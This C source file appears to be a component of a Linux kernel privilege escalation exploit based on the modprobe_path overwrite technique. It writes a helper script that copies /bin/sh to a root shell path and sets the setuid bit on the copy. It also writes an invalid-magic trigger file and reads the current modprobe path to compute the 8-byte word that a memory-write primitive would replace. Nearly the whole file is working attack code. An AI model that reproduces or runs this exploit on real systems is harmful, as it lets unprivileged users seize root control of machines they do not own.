#define _GNU_SOURCE

#include "modprobe.h"

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include <sys/stat.h>
#include <sys/types.h>

int starts_with(const char *s, const char *prefix)
{
	return strncmp(s, prefix, strlen(prefix)) == 0;
}

static int write_all(int fd, const void *buf, size_t len)
{
	const unsigned char *p = buf;

	while (len) {
		ssize_t n = write(fd, p, len);

		if (n < 0) {
			if (errno == EINTR)
				continue;
			return -1;
		}
		if (n == 0) {
			errno = EIO;
			return -1;
		}

		p += n;
		len -= (size_t)n;
	}

	return 0;
}

static int write_file_mode(const char *path, const void *buf, size_t len,
			   mode_t mode)
{
	int fd;
	int ret = -1;

	fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, mode);
	if (fd < 0)
		return -1;
	if (write_all(fd, buf, len) != 0)
		goto out;
	if (fchmod(fd, mode) != 0)
		goto out;

	ret = 0;

out:
	close(fd);
	return ret;
}

int setup_modprobe_files(void)
{
	static const char helper[] =
		"#!/bin/sh\n"
		"\n"
		"/bin/cp /bin/sh " ROOT_SHELL_PATH "\n"
		"/bin/chmod u+s " ROOT_SHELL_PATH "\n";
	static const unsigned char trigger[] = {
		0xff, 0xff, 0xff, 0xff,
	};

	if (write_file_mode(MODPROBE_HELPER_PATH, helper, sizeof(helper) - 1,
			    0755) != 0)
		return -1;
	return write_file_mode(MODPROBE_TRIGGER_PATH, trigger, sizeof(trigger),
			       0755);
}

int read_modprobe_path(char *buf, size_t len)
{
	ssize_t n;
	int fd;

	if (!len) {
		errno = EINVAL;
		return -1;
	}

	fd = open(MODPROBE_SYSCTL_PATH, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;

	n = read(fd, buf, len - 1);
	close(fd);
	if (n < 0)
		return -1;
	if (n == 0) {
		errno = EIO;
		return -1;
	}

	buf[n] = '\0';
	buf[strcspn(buf, "\n")] = '\0';
	return 0;
}

int configure_modprobe_old_word(char *initial, size_t initial_len,
				uint64_t *old_value)
{
	if (read_modprobe_path(initial, initial_len) != 0)
		return -1;

	if (starts_with(initial, "/usr/sbi")) {
		*old_value = 0x6962732f7273752fULL;
		return 0;
	}
	if (starts_with(initial, "/sbin/mo")) {
		*old_value = 0x6f6d2f6e6962732fULL;
		return 0;
	}

	fprintf(stderr, "[-] unsupported modprobe path: %s\n", initial);
	errno = EINVAL;
	return -1;
}
